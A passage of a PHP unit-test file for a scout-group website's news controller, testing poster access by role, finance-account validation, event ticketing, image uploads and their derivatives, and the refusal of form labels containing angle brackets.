        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Secret CU', Article::VISIBILITY_ADMIN, false, null, null, $this->chiefAccountId, 'Résumé confidentiel.'));
        $this->articleRepository->setShortUrlCode($id, 'secret1');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
        $this->assertStringNotContainsString('%PDF-', $response->getBody());
    }

    public function testPosterIsServedForTheSameArticleToARoleThatMaySeeIt(): void
    {
        AuthSession::login($this->chiefAccountId, 'admin@test.com', 'admin');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Secret CU', Article::VISIBILITY_ADMIN, false, null, null, $this->chiefAccountId, 'Résumé confidentiel.'));
        $this->articleRepository->setShortUrlCode($id, 'secret2');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringStartsWith('%PDF-', $response->getBody());
    }

    public function testPosterDownloadIncludesTheFeaturedImageWhenItExists(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $uploadHandler = new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir());
        $fileId = $uploadHandler->handle($this->fakeUploadedImage(), 'news/images', ['image/jpeg'], 5 * 1024 * 1024, 'public', 'news', $this->chiefAccountId);

        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp d\'été', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', $fileId));
        $this->articleRepository->setShortUrlCode($id, 'abc124');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringStartsWith('%PDF-', $response->getBody());
    }

    /**
     * form_finance_account_id used to be stored verbatim, and later drove
     * Service\ResponseService's createReceivable() — so an author could bind
     * a form's payments to any account id at all, including a draft or
     * archived one the picker never offered. It is now validated against the
     * very list the picker is built from.
     *
     * @return array{0: NewsController, 1: string} controller + a valid CSRF token
     */
    private function controllerWithFinanceAccounts(): array
    {
        $financeAccount = $this->createStub(FinanceAccountInterface::class);
        $financeAccount->method('getConfiguredAccounts')->willReturn([
            ['id' => 42, 'name' => 'Compte unité', 'iban' => null, 'holder_name' => null, 'section_id' => null],
        ]);
        $financeAccount->method('getCategories')->willReturn([['id' => 5, 'name' => 'Activités']]);

        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir()),
            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService,
            new \Modules\News\Service\TicketService($this->responseRepository), $financeAccount
        );

        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        return [$controller, CsrfGuard::generateToken()];
    }

    /**
     * @return array<string, string>
     */
    private function formArticleBody(string $csrfToken, string $financeAccountId): array
    {
        return [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp payant',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'has_form' => '1',
            'form_access' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'form_finance_account_id' => $financeAccountId,
            'form_finance_category_id' => '5',
            'fields_json' => (string) json_encode([
                ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
            ]),
        ];
    }

    // --- IT-02: the two switch transitions ---

    /**
     * The editor's POST body for an article whose form carries the
     * ticketing switch.
     *
     * @return array<string, string>
     */
    private function ticketedArticleBody(string $csrfToken, bool $issuesTicket, string $eventDate = '', string $eventLocation = ''): array
    {
        $body = [
            '_csrf_token' => $csrfToken,
            'title' => 'Souper spaghetti',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'form_event_date' => $eventDate,
            'form_event_location' => $eventLocation,
            'fields_json' => (string) json_encode([
                ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
            ]),
        ];
        if ($issuesTicket) {
            $body['form_issues_ticket'] = '1';
        }

        return $body;
    }

    public function testRaisingTheTicketSwitchBackfillsExistingResponsesAndSchedulesTheirTickets(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $first = $this->responseRepository->create($formId, null, null, 'a@test.com', [], null, null);
        $second = $this->responseRepository->create($formId, null, null, 'b@test.com', [], null, null);

        $token = CsrfGuard::generateToken();
        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $this->newsController->update(
            new Request('POST', '/news/' . $articleId, [], $this->ticketedArticleBody($token, true), [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame(302, $response->getStatusCode());
        // Without this, the people who signed up first are the ones who
        // turn up at the door with nothing.
        $this->assertTrue($this->responseRepository->findById($first)?->hasTicket());
        $this->assertTrue($this->responseRepository->findById($second)?->hasTicket());

        // The references are written inline so the door screen works at
        // once; the e-mails go to the scheduler, one SMTP round trip per
        // family being the slow half.
        $scheduled = $this->schedulerService->find('news', SendPendingTicketsHandler::TASK_KEY, SendPendingTicketsHandler::referenceFor($formId));
        $this->assertNotNull($scheduled);
        $payload = json_decode((string) $scheduled['payload'], true);
        $this->assertSame($formId, $payload['form_id']);
        $this->assertEqualsCanonicalizing([$first, $second], $payload['response_ids']);
    }

    public function testSavingAnAlreadyTicketedFormSchedulesNothingAndReissuesNothing(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null, true);
        $responseId = $this->responseRepository->create($formId, null, null, 'a@test.com', [], null, null);
        (new \Modules\News\Service\TicketService($this->responseRepository))->issueFor($this->responseRepository->findById($responseId));
        $before = $this->responseRepository->findById($responseId)?->ticketReference;

        $token = CsrfGuard::generateToken();
        $_FILES['image'] = $this->fakeUploadedImage();
        $this->newsController->update(
            new Request('POST', '/news/' . $articleId, [], $this->ticketedArticleBody($token, true), [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame($before, $this->responseRepository->findById($responseId)?->ticketReference);
        $this->assertNull($this->schedulerService->find('news', SendPendingTicketsHandler::TASK_KEY, SendPendingTicketsHandler::referenceFor($formId)));
    }

    public function testLoweringTheTicketSwitchLeavesIssuedTicketsIntact(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null, true);
        $responseId = $this->responseRepository->create($formId, null, null, 'a@test.com', [], null, null);
        (new \Modules\News\Service\TicketService($this->responseRepository))->issueFor($this->responseRepository->findById($responseId));
        $reference = $this->responseRepository->findById($responseId)?->ticketReference;

        $token = CsrfGuard::generateToken();
        $_FILES['image'] = $this->fakeUploadedImage();
        $this->newsController->update(
            new Request('POST', '/news/' . $articleId, [], $this->ticketedArticleBody($token, false), [], []),
            ['id' => (string) $articleId]
        );

        // We stop delivering; we do not revoke what was promised.
        $this->assertFalse($this->formRepository->findById($formId)?->issuesTicket);
        $this->assertSame($reference, $this->responseRepository->findById($responseId)?->ticketReference);
    }

    public function testTheEventDateAndPlaceAreSavedOnTheForm(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);

        $token = CsrfGuard::generateToken();
        $_FILES['image'] = $this->fakeUploadedImage();
        $this->newsController->update(
            new Request('POST', '/news/' . $articleId, [], $this->ticketedArticleBody($token, true, '2026-03-14', 'Salle paroissiale'), [], []),
            ['id' => (string) $articleId]
        );

        $form = $this->formRepository->findById($formId);
        $this->assertSame('2026-03-14', $form?->eventDate);
        $this->assertSame('Salle paroissiale', $form?->eventLocation);
        // The EVENT's date, never closes_at: a dinner on 14 March closes
        // its bookings on the 10th, and reading one as the other would
        // hide the event on the evening it is being controlled.
        $this->assertNull($form?->closesAt);
    }

    public function testTheIcsWarningAppearsOnlyOnceSomebodyHasAnswered(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null, true, '2026-03-14', 'Salle');

        $quiet = $this->newsController->edit(
            new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();
        $this->assertStringContainsString('data-ics-already-sent="0"', $quiet);

        $this->responseRepository->create($formId, null, null, 'a@test.com', [], null, null);

        $warned = $this->newsController->edit(
            new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        // Named while the author can still decide, never as a refusal: an
        // ICS already in somebody's calendar is the one thing on this form
        // that cannot be corrected afterwards.
        $this->assertStringContainsString('data-ics-already-sent="1"', $warned);
        $this->assertStringContainsString('ne sera pas corrigé', $warned);
    }

    public function testAnUnofferedFinanceAccountIsNotBoundToTheForm(): void
    {
        [$controller, $csrfToken] = $this->controllerWithFinanceAccounts();

        // 99 is not in getConfiguredAccounts() — never offered by the picker.
        $request = new Request('POST', '/news', [], $this->formArticleBody($csrfToken, '99'), [], []);
        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $controller->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $form = $this->formService->findByArticleId($article->id);
        $this->assertNotNull($form);
        $this->assertNull($form->financeAccountId, 'an unoffered account must not be bound');
    }

    public function testAnOfferedFinanceAccountIsStillBoundNormally(): void
    {
        [$controller, $csrfToken] = $this->controllerWithFinanceAccounts();

        $request = new Request('POST', '/news', [], $this->formArticleBody($csrfToken, '42'), [], []);
        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $controller->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $form = $this->formService->findByArticleId($article->id);
        $this->assertNotNull($form);
        $this->assertSame(42, $form->financeAccountId);
        $this->assertSame(5, $form->financeCategoryId);
    }

    /**
     * NewsException is a Core\Exception\UserFacingException, and store()
     * renders its message into the editor — so an upload failure must not be
     * re-labelled as user-facing just by being re-wrapped. The handler's own
     * sentence survives only because Core\File\UploadException claims to be
     * fit for a visitor; anything else propagates instead.
     */
    public function testAnImageUploadFailureIsNotRelabelledAsUserFacing(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();
        $_FILES['image'] = $this->fakeUploadedImage();

        $uploadHandler = $this->createStub(UploadHandler::class);
        $uploadHandler->method('handle')->willThrowException(
            new \Core\File\UploadException('Le fichier dépasse la taille maximale de 5 Mo.')
        );
        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService,
            new SeoKeywordService(null), new PosterPdfService(), $this->scoutYearService,
            $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, $uploadHandler,
            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService,
            new \Modules\News\Service\TicketService($this->responseRepository)
        );

        $response = $controller->store(new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Nouveau camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []), []);

        $this->assertSame(422, $response->getStatusCode());
        $body = $response->getBody();
        $this->assertStringContainsString('taille maximale', $body);
        $this->assertSame(0, count($this->articleRepository->findAll()));
    }

    /**
     * The list/home cards render /files/{id}/thumb and the detail page
     * /files/{id}/md — FileController::variant() never falls back to the
     * original, so the upload itself must leave both derivatives behind.
     */
    public function testStoringAnArticleImageGeneratesItsThumbAndMdDerivatives(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $fileRepository = new FileRepository($this->pdo);
        $variantService = new \Core\Photo\ImageVariantService(
            $fileRepository, new \Core\Photo\ImageVariantProcessor(), sys_get_temp_dir()
        );
        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler($fileRepository, sys_get_temp_dir()),
            $fileRepository, sys_get_temp_dir(), $this->journalService,
            new \Modules\News\Service\TicketService($this->responseRepository), null, null, $variantService
        );

        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $controller->store(new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp illustré',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []), []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $this->assertNotNull($article->imageFileId);
        $file = $fileRepository->findById($article->imageFileId);
        $this->assertNotNull($file);
        $this->assertNotNull($variantService->resolvePath($file->relativePath, 'thumb'));
        $this->assertNotNull($variantService->resolvePath($file->relativePath, 'md'));
    }

    /**
     * The images of an article's text get their derivatives at upload too,
     * and the editor inserts the `md` rendition: the original never goes
     * through the offline cache (#883), and it is a multi-megabyte
     * photograph where a 1024px one does.
     */
    public function testABodyImageIsUploadedWithItsDerivativesAndInsertedAsItsMediumRendition(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        [$controller, $fileRepository, $variantService] = $this->controllerWithImageVariants();

        $_FILES['image'] = $this->fakeUploadedImage();
        // Issue #1109: the address handed to the editor is the opaque one.
        \Core\File\FilePublicIds::useRepository($fileRepository);
        try {
            $response = $controller->uploadBodyImage(new Request('POST', '/news/images/upload', [], [
                '_csrf_token' => CsrfGuard::generateToken(),
            ], [], []), []);
        } finally {
            \Core\File\FilePublicIds::useRepository(null);
        }

        $payload = json_decode($response->getBody(), true);
        $this->assertTrue($payload['success']);
        $this->assertMatchesRegularExpression('~^/files/[A-Za-z0-9_-]{22}/md$~', $payload['url']);
        $file = $fileRepository->findByPublicId(explode('/', $payload['url'])[2]);
        $this->assertNotNull($file);
        $this->assertNotNull($variantService->resolvePath($file->relativePath, 'thumb'));
        $this->assertNotNull($variantService->resolvePath($file->relativePath, 'md'));
        // Issue #1110: not saved in any article yet, so not public — the
        // floor of whoever may write one, which the author holds.
        $this->assertSame(\Modules\News\Service\BodyImageAccess::UNSAVED_ROLE_MIN, $file->roleMin);
        $this->assertNotSame('public', $file->roleMin);
    }

    /**
     * A file that is no image is refused with the reason, as JSON the
     * editor shows beside its toolbar — and nothing is stored.
     */
    public function testABodyImageThatIsNoImageIsRefusedWithTheReason(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $path = tempnam(sys_get_temp_dir(), 'news_test_text_');
        file_put_contents($path, "Ceci n'est pas une image.\n");
        $_FILES['image'] = [
            'name' => 'photo.jpg', 'tmp_name' => $path, 'error' => UPLOAD_ERR_OK,
            'size' => (int) filesize($path), 'type' => 'image/jpeg',
        ];

        try {
            $response = $this->newsController->uploadBodyImage(new Request('POST', '/news/images/upload', [], [
                '_csrf_token' => CsrfGuard::generateToken(),
            ], [], []), []);
        } finally {
            @unlink($path);
        }

        $this->assertSame(422, $response->getStatusCode());
        $this->assertSame(
            ['success' => false, 'error' => 'Type de fichier non autorisé (text/plain).'],
            json_decode($response->getBody(), true)
        );
        $this->assertSame(0, (int) $this->pdo->query('SELECT COUNT(*) FROM files')->fetchColumn());
    }

    /**
     * « Générer avec l'IA » on a site with no AI provider: the editor is
     * told so, as JSON, and keeps whatever the author already typed.
     */
    public function testGeneratingKeywordsWithoutAnAiProviderSaysSo(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->generateSeoKeywords(
            new RequestWithInput('POST', '/news/seo/generate-keywords', [], [], [], [], (string) json_encode([
                '_csrf_token' => CsrfGuard::generateToken(),
                'title' => 'Camp',
                'body_html' => '<p>Le camp commence samedi.</p>',
            ])),
            []
        );

        $this->assertSame(422, $response->getStatusCode());
        $this->assertSame(
            ['success' => false, 'error' => 'Service IA non disponible.'],
            json_decode($response->getBody(), true)
        );
    }

    public function testGeneratingASummaryWithoutAnAiProviderSaysSo(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->generateSummary(
            new RequestWithInput('POST', '/news/seo/generate-summary', [], [], [], [], (string) json_encode([
                '_csrf_token' => CsrfGuard::generateToken(),
                'title' => 'Camp',
                'body_html' => '<p>Le camp commence samedi.</p>',
            ])),
            []
        );

        $this->assertSame(422, $response->getStatusCode());
        $this->assertSame(
            ['success' => false, 'error' => 'Service IA non disponible.'],
            json_decode($response->getBody(), true)
        );
    }

    /**
     * An article written before #883 carries its text images as originals.
     * The page shows the `md` rendition wherever it exists, and leaves an
     * image without one alone: a heavy image beats a broken one.
     */
    public function testAStoredBodyImageIsShownAsItsMediumRenditionWhereItExists(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        [$controller, $fileRepository, $variantService] = $this->controllerWithImageVariants();
        $uploadHandler = new UploadHandler($fileRepository, sys_get_temp_dir());
        $withMedium = $uploadHandler->handle($this->fakeUploadedImage(), 'news/images', ['image/jpeg'], 1_000_000, 'public', 'news', $this->chiefAccountId);
        $variantService->generate($withMedium, 'md');
        $withoutMedium = $uploadHandler->handle($this->fakeUploadedImage(), 'news/images', ['image/jpeg'], 1_000_000, 'public', 'news', $this->chiefAccountId);

        $withMediumPublic = (string) $fileRepository->findById($withMedium)?->publicId;
        $withoutMediumPublic = (string) $fileRepository->findById($withoutMedium)?->publicId;
        \Core\File\FilePublicIds::useRepository($fileRepository);

        $_FILES['image'] = $this->fakeUploadedImage();
        $controller->store(new Request('POST', '/news', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Souvenirs du camp',
            'summary' => 'Un résumé en une phrase.',
            'visibility' => 'public',
            'has_form' => '1',
            'form_access' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'fields_json' => json_encode([[
                'id' => null, 'field_type' => 'text', 'label' => null, 'is_required' => false,
                'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null,
                'confirmation_text' => '<p><img src="/files/' . $withMediumPublic . '" alt="Feu">'
                    . '<img src="/files/' . $withoutMediumPublic . '" alt="Tente"></p>',
            ]]),
        ], [], []), []);
        $articleId = $this->articleRepository->findAll()[0]->id;

        try {
            $html = $controller->show(
                new Request('GET', '/news/' . $articleId, [], [], [], []),
                ['id' => (string) $articleId]
            )->getBody();
        } finally {
            \Core\File\FilePublicIds::useRepository(null);
        }

        $this->assertStringContainsString('src="/files/' . $withMediumPublic . '/md"', $html);
        $this->assertStringContainsString('src="/files/' . $withoutMediumPublic . '"', $html);
        $this->assertStringNotContainsString('src="/files/' . $withMediumPublic . '"', $html);
    }

    /**
     * @return array{0: NewsController, 1: FileRepository, 2: \Core\Photo\ImageVariantService}
     */
    private function controllerWithImageVariants(): array
    {
        $fileRepository = new FileRepository($this->pdo);
        $variantService = new \Core\Photo\ImageVariantService(
            $fileRepository, new \Core\Photo\ImageVariantProcessor(), sys_get_temp_dir()
        );
        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler($fileRepository, sys_get_temp_dir()),
            $fileRepository, sys_get_temp_dir(), $this->journalService,
            new \Modules\News\Service\TicketService($this->responseRepository), null, null, $variantService
        );

        return [$controller, $fileRepository, $variantService];
    }

    public function testStoreCreatesArticleWithFormAndRedirects(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $fieldsJson = json_encode([
            ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
        ]);

        $request = new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Nouveau camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'has_form' => '1',
            'form_access' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'fields_json' => $fieldsJson,
        ], [], []);

        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $this->assertSame('Nouveau camp', $article->title);
        $this->assertTrue($article->hasForm);
        $this->assertNotNull($article->imageFileId);
    }

    /**
     * Issue #1120: a refused field label is checked before the article is
     * written — no draft is left behind without its form.
     */
    public function testStoreWithARefusedLabelWritesNoArticle(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $request = new Request('POST', '/news', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Souper',
            'summary' => 'Un résumé en une phrase.',
            'visibility' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'fields_json' => json_encode([
                ['field_type' => 'number', 'label' => 'Repas <b>x</b>', 'price_per_unit' => 8],
            ]),
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store($request, []);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString('ne peut pas contenir les caractères', $response->getBody());
        $this->assertSame([], $this->articleRepository->findAll());
    }

    /**
     * Issue #1120: on an existing article, the same refusal leaves the
     * article exactly as it was.
     */
    public function testUpdateWithARefusedLabelLeavesTheArticleUntouched(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create(
            'Avant',
            Article::VISIBILITY_PUBLIC,
            true,
            null,
            null,
            $this->chiefAccountId
        );
        $request = new Request('POST', '/news/' . $articleId, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Après',
            'summary' => 'Un résumé en une phrase.',
            'visibility' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'fields_json' => json_encode([['field_type' => 'short_text', 'label' => 'Nom >']]),
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->update($request, ['id' => (string) $articleId]);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString('ne peut pas contenir les caractères', $response->getBody());
        $this->assertSame('Avant', $this->articleRepository->findById($articleId)?->title);
    }

    /**
     * Issue #1381: an answered « Membres » field turned into a text field is
     * refused before the article is written — title included — so the
     * refusal leaves both the article and its form as they were.
     */
    public function testUpdateChangingAnAnsweredMembersFieldLeavesTheArticleUntouched(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create(
            'Avant',
            Article::VISIBILITY_PUBLIC,
            true,
            null,
            null,
            $this->chiefAccountId
        );
        $form = $this->formService->save($articleId, [
            'access' => \Modules\News\Repository\NewsForm::ACCESS_IDENTIFIED,
            'response_limit' => \Modules\News\Repository\NewsForm::RESPONSE_LIMIT_UNLIMITED,
            'opens_at' => null, 'closes_at' => null, 'is_force_closed' => false,
            'response_role_min' => 'chief', 'digest_email' => null, 'finance_account_id' => null,
        ], [[
            'id' => null, 'field_type' => 'checkbox', 'label' => 'Pour qui ?', 'is_required' => false,
            'options_source' => 'members', 'options_manual' => null, 'capacity_max' => null,
            'price_per_unit' => null, 'confirmation_text' => null,
        ]]);
        $fieldId = $this->formService->getFields($form->id)[0]->id;
        $this->responseRepository->create($form->id, null, null, 'famille@test.com', [], null, null);

        $request = new Request('POST', '/news/' . $articleId, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Après',
            'summary' => 'Un résumé en une phrase.',
            'visibility' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'fields_json' => json_encode([['id' => $fieldId, 'field_type' => 'short_text', 'label' => 'Pour qui ?']]),
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->update($request, ['id' => (string) $articleId]);

        $this->assertSame(422, $response->getStatusCode());
        $body = html_entity_decode($response->getBody(), ENT_QUOTES);
        $this->assertStringContainsString('a déjà des réponses', $body);
        $this->assertSame('Avant', $this->articleRepository->findById($articleId)?->title);
        $this->assertTrue($this->formService->getFields($form->id)[0]->isMemberSourced());
    }

    /**
     * The settings an author had just chosen, as the editor's POST sends
     * them — and a field label the server refuses, so the form comes back
     * with an error (issue #1140).
     *
     * @return array<string, string>
     */
    private function refusedSubmissionWithSettings(): array
    {
        return [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Souper',
            'summary' => 'Un résumé en une phrase.',
            'visibility' => 'public',
            'form_response_limit' => 'one_per_account',
            'form_response_role_min' => 'intendant',
            'form_opens_at' => '2026-12-01',
            'form_closes_at' => '2026-12-20',
            'form_is_force_closed' => '1',
            'form_issues_ticket' => '1',
            'form_event_date' => '2026-12-24',
            'form_event_location' => 'Salle paroissiale',
            // Refused: the label may not carry `<` or `>`.
            'fields_json' => (string) json_encode([['field_type' => 'short_text', 'label' => 'Nom >']]),
        ];
    }

    private function assertTheRefusedSettingsAreShownAsSubmitted(string $html): void
    {
        $this->assertStringContainsString('ne peut pas contenir les caractères', $html);
        $this->assertMatchesRegularExpression('/id="form_issues_ticket"[^>]*value="1"\s+checked/', $html, 'ticket switch');
        $this->assertMatchesRegularExpression('/id="form_event_date"[^>]*value="2026-12-24"/', $html, 'event date');
        $this->assertMatchesRegularExpression('/id="form_event_location"[^>]*value="Salle paroissiale"/', $html, 'event place');
        $this->assertMatchesRegularExpression('/id="form_opens_at"[^>]*value="2026-12-01"/', $html, 'opening date');
        $this->assertMatchesRegularExpression('/id="form_closes_at"[^>]*value="2026-12-20"/', $html, 'closing date');
        $this->assertMatchesRegularExpression('/id="form_is_force_closed"[^>]*value="1"\s+checked/', $html, 'forced closure');
        $this->assertMatchesRegularExpression('/<option value="one_per_account"\s+selected/', $html, 'response limit');
        $this->assertMatchesRegularExpression('/id="resp-role-intendant"[^>]*value="intendant"\s+checked/', $html, 'minimum role');
        $this->assertDoesNotMatchRegularExpression('/id="resp-role-chief"[^>]*value="chief"\s+checked/', $html);
    }

    /**
     * Issue #1140: a refused CREATION shows the settings the author had
     * just chosen, not the defaults of a new article. Without this the
     * next submission quietly saved an event without its tickets.
     */
    public function testARefusedCreationShowsTheFormSettingsAsSubmitted(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store(
            new Request('POST', '/news', [], $this->refusedSubmissionWithSettings(), [], []),
            []
        );

        $this->assertSame(422, $response->getStatusCode());
        $this->assertTheRefusedSettingsAreShownAsSubmitted($response->getBody());
    }

    /**
     * Issue #1140: and a refused MODIFICATION shows them over the saved
     * ones — here a form that had no ticket, no dates and the lowest role.
     */
    public function testARefusedModificationShowsTheFormSettingsAsSubmittedNotAsSaved(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Avant', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->update(
            new Request('POST', '/news/' . $articleId, [], $this->refusedSubmissionWithSettings(), [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame(422, $response->getStatusCode());
        $this->assertTheRefusedSettingsAreShownAsSubmitted($response->getBody());
        // The saved form is untouched: only the re-render changed.
        $saved = $this->formRepository->findByArticleId($articleId);
        $this->assertFalse($saved?->issuesTicket);
